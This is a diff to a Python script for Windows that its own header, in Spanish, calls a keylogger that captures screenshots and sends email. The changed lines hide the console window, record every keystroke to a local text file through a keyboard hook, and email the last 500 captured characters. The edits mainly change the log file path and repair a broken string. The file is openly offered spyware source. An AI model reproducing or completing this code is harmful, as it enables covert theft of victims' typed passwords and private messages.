@@ -1,5 +1,6 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#!/usr/bin/python
+# Coded by: Oscar Peñaherrera
+# keylogger Captura de pantalla y envio de correo
 
 import win32console
 import win32gui
@@ -17,7 +18,7 @@ win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win,0)
 
 #crea el archivo .txt
-f=open("c:\output.txt","w+")
+f=open('C:/Users/osmap/Documents/texto.txt',"w+")
 f.close
 
 #Variable que cuenta las tecas presionadas
@@ -59,7 +60,7 @@ def OnKeyboardEvent(event):
 
     if event.Ascii !=0 or 8:
         #abre output.txt
-        f=open('c:\output.txt','r+')
+        f=open('C:/Users/osmap/Documents/texto.txt','r+')
         buffer=f.read()
         f.close()
 
@@ -68,8 +69,7 @@ def OnKeyboardEvent(event):
 
         elif  count == 500:
             #Envia los ultimos 500 caracteres
-            capturado = buffer[-500:].replace("\n","
-")
+            capturado = buffer[-500:].replace("\n","")
             send_email(capturado)
             count = 0
 
